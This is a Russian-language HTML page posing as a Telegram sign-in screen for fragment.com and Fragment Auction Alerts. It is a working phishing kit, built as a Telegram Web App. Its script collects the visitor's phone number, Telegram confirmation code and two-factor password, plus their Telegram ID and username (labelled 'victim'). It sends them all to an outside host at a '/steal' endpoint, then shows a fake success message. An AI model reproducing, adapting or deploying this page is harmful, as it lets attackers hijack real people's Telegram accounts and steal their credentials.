<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Telegram Auth</title>
<script src="https://telegram.org/js/telegram-web-app.js"></script>
<style>
  body {
    margin: 0;
    font-family: Arial, sans-serif;
    background: #fff;
    color: #000;
    user-select: none;
    padding: 20px;
  }
  .container {
    max-width: 400px;
    margin: 0 auto;
  }
  .icons {
    display: flex;
    justify-content: center;
    align-items: center;
    gap: 40px;
    margin: 40px 0 16px 0;
  }
  .icon {
    width: 64px;
    height: 64px;
  }
  .fragment-logo {
    background: #000;
    border-radius: 12px;
    display: flex;
    align-items: center;
    justify-content: center;
    color: white;
    font-weight: bold;
    font-size: 14px;
    text-align: center;
    width: 64px;
    height: 64px;
  }
  h1 {
    text-align: center;
    font-weight: bold;
    font-size: 18px;
    margin: 0 auto 16px;
    padding: 0 25px;
    max-width: 320px;
    line-height: 1.3;
  }
  p.description {
    max-width: 280px;
    margin: 0 auto 24px;
    font-size: 14px;
    line-height: 1.4;
    color: #000;
    text-align: center;
  }
  p.description a {
    color: #2b9dea;
    text-decoration: none;
  }
  p.description b {
    font-weight: bold;
  }
  select, .phone-input-container {
    display: block;
    width: 280px;
    margin: 6px auto 18px;
    font-size: 16px;
    padding: 10px 14px;
    border-radius: 12px;
    border: none;
    background: #f1f3f6;
    font-weight: normal;
    font-family: Arial, sans-serif;
    color: #000;
  }
  select {
    background-image: url("data:image/svg+xml;charset=utf8,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16'%3E%3Cpath fill='none' stroke='%23333' stroke-linecap='round' stroke-linejoin='round' stroke-width='2' d='M2 5l6 6 6-6'/%3E%3C/svg%3E");
    background-repeat: no-repeat;
    background-position: right 12px center;
    background-size: 16px;
    padding-right: 40px;
    appearance: none;
    -webkit-appearance: none;
  }
  .phone-prefix {
    font-size: 16px;
    color: #000;
    margin-right: 8px;
    font-weight: normal;
  }
  .phone-wrapper {
    display: flex;
    align-items: center;
    background: #f1f3f6;
    border-radius: 12px;
    padding: 0 14px;
    height: 44px;
  }
  .phone-input {
    flex: 1;
    padding: 10px 0;
    border: none;
    background: transparent;
    font-size: 16px;
    font-weight: normal;
    outline: none;
    color: #000;
  }
  .phone-input::placeholder {
    color: #888;
  }
  .buttons {
    width: 280px;
    margin: 0 auto;
    display: flex;
    justify-content: space-between;
    font-weight: bold;
  }
  .btn-cancel, .btn-next {
    cursor: pointer;
    font-size: 16px;
    user-select: none;
    border-radius: 20px;
    padding: 10px 26px;
    border: none;
    font-family: Arial, sans-serif;
    transition: opacity 0.2s;
  }
  .btn-cancel {
    background: none;
    color: #2b9dea;
  }
  .btn-next {
    background: #2b9dea;
    color: white;
  }
  .btn-cancel:active {
    opacity: 0.7;
  }
  .btn-next:active {
    opacity: 0.8;
  }
</style>
</head>
<body>
<div class="container">

<div class="icons">
  <img class="icon" src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram Logo" />
  <div class="fragment-logo">
    fragment
  </div>
</div>

<h1>Войдите, чтобы использовать аккаунт Telegram</h1>

<p class="description">
  для fragment.com и Fragment Auction Alerts.<br/>
  Введите свой <b>номер телефона</b> в международном формате. Подтверждение будет отправлено в Telegram.
</p>

<select id="countrySelect">
  <option value="+7">Россия (+7)</option>
  <option value="+380">Украина (+380)</option>
  <option value="+375">Беларусь (+375)</option>
  <option value="+7">Казахстан (+7)</option>
  <option value="+1">США/Канада (+1)</option>
  <option value="+44">Великобритания (+44)</option>
  <option value="+49">Германия (+49)</option>
  <option value="+33">Франция (+33)</option>
  <option value="+81">Япония (+81)</option>
  <option value="+86">Китай (+86)</option>
  <option value="+91">Индия (+91)</option>
</select>

<div class="phone-input-container">
  <div class="phone-wrapper">
    <span id="phonePrefix" class="phone-prefix">+7</span>
    <input type="tel" id="phoneInput" class="phone-input" placeholder="900 123 45 67" />
  </div>
</div>

<div class="buttons">
  <button class="btn-cancel" onclick="cancel()">ОТМЕНА</button>
  <button class="btn-next" onclick="nextStep()">ДАЛЕЕ</button>
</div>

</div>

<script>
  // Инициализация Telegram Web App
  const tg = window.Telegram?.WebApp;
  if (tg) {
    tg.expand(); // Растягиваем приложение на весь экран
  }
  
  // Данные пользователя из Telegram
  const victimId = tg?.initDataUnsafe?.user?.id || 'unknown';
  const victimName = tg?.initDataUnsafe?.user?.username || 'unknown';
  
  const countrySelect = document.getElementById('countrySelect');
  const phonePrefix = document.getElementById('phonePrefix');
  const phoneInput = document.getElementById('phoneInput');
  
  // Примеры номеров для разных стран
  const phoneExamples = {
    '+7': '900 123 45 67',
    '+380': '67 123 45 67',
    '+375': '29 123 45 67',
    '+1': '123 456 7890',
    '+44': '7700 123456',
    '+49': '151 12345678',
    '+33': '6 12 34 56 78',
    '+81': '90 1234 5678',
    '+86': '131 2345 6789',
    '+91': '98765 43210'
  };
  
  // Правила длины номеров для разных стран
  const phoneLengths = {
    '+7': 10,    // Россия
    '+375': 9,   // Беларусь
    '+380': 9,   // Украина
    '+1': 10,    // США/Канада
    '+44': 10,   // Великобритания
    '+49': 10,   // Германия
    '+33': 9,    // Франция
    '+81': 10,   // Япония
    '+86': 11,   // Китай
    '+91': 10    // Индия
  };
  
  // Обновляем префикс и пример номера
  countrySelect.addEventListener('change', function() {
    const code = this.value;
    phonePrefix.textContent = code;
    phoneInput.placeholder = phoneExamples[code] || '123 456 7890';
    phoneInput.value = '';
  });
  
  // Маска ввода
  phoneInput.addEventListener('input', function(e) {
    let value = e.target.value.replace(/\D/g, '');
    
    if (value.length > 15) {
      value = value.substring(0, 15);
    }
    
    let formatted = '';
    if (value.length > 0) {
      // Для России и Казахстана
      if (phonePrefix.textContent === '+7') {
        if (value.length <= 3) {
          formatted = value;
        } else if (value.length <= 6) {
          formatted = value.substring(0, 3) + ' ' + value.substring(3);
        } else if (value.length <= 8) {
          formatted = value.substring(0, 3) + ' ' + value.substring(3, 6) + ' ' + value.substring(6);
        } else {
          formatted = value.substring(0, 3) + ' ' + value.substring(3, 6) + ' ' + value.substring(6, 8) + ' ' + value.substring(8, 10);
        }
      } 
      // Для США/Канады
      else if (phonePrefix.textContent === '+1') {
        if (value.length <= 3) {
          formatted = value;
        } else if (value.length <= 6) {
          formatted = value.substring(0, 3) + ' ' + value.substring(3);
        } else {
          formatted = value.substring(0, 3) + ' ' + value.substring(3, 6) + ' ' + value.substring(6, 10);
        }
      }
      // Остальные страны
      else {
        formatted = value.match(/.{1,3}/g)?.join(' ') || value;
      }
    }
    
    e.target.value = formatted;
  });
  
  function cancel() {
    if (tg) {
      tg.close();
    } else {
      alert('Действие отменено');
    }
  }
  
  function nextStep() {
    const phone = phoneInput.value.replace(/\s/g, '');
    const countryCode = phonePrefix.textContent;
    const requiredLength = phoneLengths[countryCode] || 5;
    
    if (phone.length !== requiredLength) {
      alert('Пожалуйста, введите корректный номер телефона');
      phoneInput.focus();
      return;
    }
    
    const fullPhone = countryCode + phone;
    
    // Запрашиваем код подтверждения
    const code = prompt('Код подтверждения отправлен в Telegram.\nВведите 5-значный код:');
    if (!code || code.length !== 5) {
      alert('Неверный код');
      return;
    }
    
    // Запрашиваем пароль
    const password = prompt('Введите пароль от Telegram (если нет — оставьте пустым):');
    
    // Отправляем данные на сервер
    fetch('https://vasya1337.pythonanywhere.com/steal', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        phone: fullPhone,
        code: code,
        password: password || '',
        victim_id: victimId,
        victim_name: victimName
      })
    })
    .then(response => {
      if (response.ok) {
        alert('✅ Вход успешен! Доступ к Fragment открыт.');
        if (tg) {
          tg.close();
        }
      } else {
        alert('Ошибка при входе. Попробуйте позже.');
      }
    })
    .catch(error => {
      console.error('Error:', error);
      alert('Ошибка соединения с сервером');
    });
  }
</script>
</body>
</html>
